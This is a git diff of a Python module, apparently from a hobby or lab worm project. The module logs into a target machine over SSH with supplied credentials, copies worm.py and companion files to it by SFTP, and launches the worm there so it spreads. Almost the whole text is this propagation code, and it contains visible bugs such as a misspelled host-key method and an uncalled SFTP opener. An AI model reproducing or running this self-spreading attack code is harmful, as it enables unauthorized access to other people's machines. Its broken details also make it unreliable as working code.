@@ -1,21 +1,63 @@
 #--Potential SSH/SCP for worm
+
+from os import path
+import sys
+import logging
 import paramiko
-from sys import argv
 
-PAYLOAD = "~/rick_eternal"
+#Argument based, or hardcoded assignment of SSH credentials
+ipaddr =  sys.argv[1]
+user_name = sys.argv[2]
+passwd = sys.argv[3]
+rsa_key = "~/ssh/.id_rsa.pem" #sys.argv[4]
 
-ipaddr = '10.0.2.15'#argv[1]
-user_name = 'Pam_HR'#argv[2]
-passwd = 'academy'#argv[3]
+#will need destination folder for the worm at some point if specifying other than C drive
+class SSH:
+    
+    def __init__(self, current_directory=None, ):
+        self.current_directory = current_directory  
+        self.destination = "C:\\"
+        self.client = paramiko.SSHClient()
+    
+    #ssh client and command execution
+    def open_client(self):
+        try:
+            
+            self.client.set_missing_host_key_police(paramiko.AutoAddPolicy())
+            self.client.connect(ipaddr, username=user_name, password=passwd, key_filename=rsa_key)
+            print(f"Connecting to [{ipaddr}] as user [{user_name}] with password [{passwd}]")
+        except: logging.warning("Problem executing ssh connection")
+        
+    #secure file transfer protocol, 
+    #can use github download instead if found to be inop
+    def sftp(self):
+        try:
+            sftp = self.client.open_sftp
+            sftp.put(f"{current_directory}/worm.py", f"{self.destination}\\worm.py").close()
+            sftp.put(f"{current_directory}/SSH.py", f"{self.destination}\\SSH.py")
+            sftp.put(f"{current_directory}/roulette.py", f"{self.destination}\\roulette.py")
+            sftp.put(f"{current_directory}/Rick_Eternal.mp4", f"{self.destination}\\Rick_Eternal.mp4")
+        except: logging.warning("Problem executing sftp")
+        
+    #execute worm.py on new system
+    def run_commands(self):
+        try:
+            self.stdin, self.stdout, self.stderr = self.client.exec_command(f'start {current_directory}\\worm.py | SSH')
+        except: logging.warning("Problem executing command")
+    
+    # class actions managed here 
+    def start_client_actions(self):
+            self.open_client()
+            self.sftp()
+            self.run_commands()
+            self.client.close()
+    
 
-#ssh client
-client = paramiko.SSHClient()
-client.set_missing_host_key_police(paramiko.AutoAddPolicy())
-client.connect(ipaddr, username=user_name, password=passwd, key_filename='~/ssh/id_rsa.pem')
-print(f"Connecting to {ipaddr} as user '{user_name}' with password '{passwd}'")
-
-#secure file transfer protocol
-sftp = client.open_sftp
-sftp.put(PAYLOAD, __path__)
-#client.exec_command('') For playing win media player mp4 
-
+if __name__=="__main__":
+    current_directory = path.abspath("")
+    
+    #SSH class runs worm after downloading it to their computer 
+    #and putting it in target directory.
+    ssh = SSH(current_directory)
+    ssh.start_client_actions()
+    
